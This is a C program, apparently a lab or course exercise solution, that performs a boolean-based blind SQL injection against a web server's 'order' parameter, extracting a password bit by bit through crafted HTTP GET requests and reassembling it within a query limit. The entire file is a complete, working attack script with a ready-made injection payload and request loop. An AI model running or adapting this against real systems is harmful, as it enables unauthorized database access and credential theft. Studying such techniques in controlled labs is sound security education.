#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define MY_ID "123456789"
#define TARGET_IP "192.168.1.202"
#define TARGET_PORT 80
#define MAX_QUERIES 400
#define BUFFER_SIZE 8192
#define SUCCESS_STRING "Your order has been sent!"

static int query_counter = 0;

/**
 * URL-encodes a string for safe transmission in HTTP requests.
 * 
 * Encodes special characters as %XX hex codes, spaces as %20.
 * Unreserved characters (A-Z, a-z, 0-9, -, _, ., ~) are left unchanged.
 * 
 * @param src Source string to encode
 * @param dest Destination buffer for encoded string
 * @param dest_size Size of destination buffer
 */
void url_encode(const char *src, char *dest, size_t dest_size) {
    const char *hex = "0123456789ABCDEF";
    size_t pos = 0;
    
    while (*src && pos < dest_size - 4) {
        if ((*src >= 'A' && *src <= 'Z') ||
            (*src >= 'a' && *src <= 'z') ||
            (*src >= '0' && *src <= '9') ||
            *src == '-' || *src == '_' || *src == '.' || *src == '~') {
            dest[pos++] = *src;
        } else if (*src == ' ') {
            dest[pos++] = '%';
            dest[pos++] = '2';
            dest[pos++] = '0';
        } else {
            dest[pos++] = '%';
            dest[pos++] = hex[((unsigned char)*src) >> 4];
            dest[pos++] = hex[((unsigned char)*src) & 0x0F];
        }
        src++;
    }
    dest[pos] = '\0';
}

/**
 * Builds a SQL injection payload to extract a specific bit from a character.
 * 
 * Creates a payload using bit-shift and bitwise AND to test if a specific bit
 * is set in the ASCII value of a character at a given position.
 * 
 * @param char_pos Position of the character in the password (1-indexed)
 * @param bit_pos Position of the bit to check (0-7, where 7 is MSB)
 * @param payload Output buffer for the SQL payload
 * @param payload_size Size of the payload buffer
 */
void build_sql_payload(int char_pos, int bit_pos, char *payload, size_t payload_size) {
    snprintf(payload, payload_size,
        "1 AND (SELECT (ASCII(SUBSTR(pwd_col, %d, 1)) >> %d) & 1 FROM table_name WHERE id_col = '%s')",
        char_pos, bit_pos, MY_ID);
}

/**
 * Creates and connects a TCP socket to the target server.
 * 
 * @return Socket file descriptor on success, -1 on failure
 */
int create_and_connect_socket(void) {
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        fprintf(stderr, "Error: Failed to create socket\n");
        return -1;
    }
    
    struct sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(TARGET_PORT);
    
    if (inet_pton(AF_INET, TARGET_IP, &server_addr.sin_addr) <= 0) {
        fprintf(stderr, "Error: Invalid address\n");
        close(sockfd);
        return -1;
    }
    
    if (connect(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        fprintf(stderr, "Error: Connection failed\n");
        close(sockfd);
        return -1;
    }
    
    return sockfd;
}

/**
 * Builds an HTTP GET request with the encoded SQL injection payload.
 * 
 * @param encoded_payload URL-encoded SQL payload
 * @param request Output buffer for the HTTP request
 * @param request_size Size of the request buffer
 */
void build_http_request(const char *encoded_payload, char *request, size_t request_size) {
    snprintf(request, request_size,
        "GET /index.php?order=%s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "Connection: close\r\n"
        "\r\n",
        encoded_payload, TARGET_IP);
}

/**
 * Sends an HTTP request over a socket.
 * 
 * @param sockfd Socket file descriptor
 * @param request HTTP request string to send
 * @return true on success, false on failure
 */
bool send_http_request(int sockfd, const char *request) {
    size_t request_len = strlen(request);
    ssize_t bytes_sent = send(sockfd, request, request_len, 0);
    if (bytes_sent < 0 || (size_t)bytes_sent != request_len) {
        fprintf(stderr, "Error: Failed to send request\n");
        return false;
    }
    return true;
}

/**
 * Receives the HTTP response and checks if it contains the success string.
 * 
 * @param sockfd Socket file descriptor
 * @return true if response contains success string, false otherwise
 */
bool receive_and_check_response(int sockfd) {
    char buffer[BUFFER_SIZE];
    ssize_t total_received = 0;
    ssize_t bytes_received;
    
    while ((bytes_received = recv(sockfd, buffer + total_received, 
                                   (size_t)(BUFFER_SIZE - total_received - 1), 0)) > 0) {
        total_received += bytes_received;
        if (total_received >= BUFFER_SIZE - 1) {
            break;
        }
    }
    
    if (total_received <= 0) {
        fprintf(stderr, "Error: Failed to receive response\n");
        return false;
    }
    
    buffer[total_received] = '\0';
    return (strstr(buffer, SUCCESS_STRING) != NULL);
}

/**
 * Checks if a specific bit is set in a character at a given position.
 * 
 * Performs a Boolean-based blind SQL injection by:
 * 1. Building an SQL payload with bit extraction logic
 * 2. URL-encoding the payload
 * 3. Sending it as an HTTP GET request
 * 4. Analyzing the response to determine if the bit is 1 or 0
 * 
 * @param char_pos Position of the character in the password (1-indexed)
 * @param bit_pos Position of the bit to check (0-7, where 7 is MSB)
 * @return true if the bit is set (1), false if unset (0) or on error
 */
bool check_bit(int char_pos, int bit_pos) {
    if (query_counter >= MAX_QUERIES) {
        fprintf(stderr, "Error: Query limit exceeded\n");
        return false;
    }
    query_counter++;
    
    char payload[1024];
    build_sql_payload(char_pos, bit_pos, payload, sizeof(payload));
    
    char encoded_payload[4096];
    url_encode(payload, encoded_payload, sizeof(encoded_payload));
    
    char request[8192];
    build_http_request(encoded_payload, request, sizeof(request));
    
    int sockfd = create_and_connect_socket();
    if (sockfd < 0) {
        return false;
    }
    
    if (!send_http_request(sockfd, request)) {
        close(sockfd);
        return false;
    }
    
    bool result = receive_and_check_response(sockfd);
    close(sockfd);
    
    return result;
}

/**
 * Main function that performs the complete blind SQL injection attack.
 * 
 * Extracts a password character-by-character using bit-by-bit extraction.
 * For each character, tests all 8 bits from MSB (bit 7) to LSB (bit 0).
 * Stops when a null character is encountered or 32 characters are extracted.
 * 
 * @return 0 on success, 1 on error
 */
int main(void) {
    printf("Starting Boolean-based Blind SQL Injection...\n");
    printf("Query limit: %d\n\n", MAX_QUERIES);
    
    char password[64] = {0};
    int password_len = 0;
    
    for (int char_idx = 1; char_idx <= 32; char_idx++) {
        unsigned char current_char = 0;
        
        for (int bit = 7; bit >= 0; bit--) {
            bool bit_value = check_bit(char_idx, bit);
            
            if (bit_value) {
                current_char |= (unsigned char)(1 << bit);
            }
            
            printf("Char %d, Bit %d: %d (Queries: %d)\n", 
                   char_idx, bit, bit_value ? 1 : 0, query_counter);
        }
        
        if (current_char == 0) {
            break;
        }
        
        password[password_len++] = (char)current_char;
        password[password_len] = '\0';
        
        printf("Character %d: '%c' (ASCII: %d)\n", char_idx, current_char, (int)current_char);
        printf("Password so far: %s\n\n", password);
    }
    
    printf("\n=== Final Result ===\n");
    printf("Extracted password: %s\n", password);
    printf("Total queries used: %d / %d\n", query_counter, MAX_QUERIES);
    
    return 0;
}
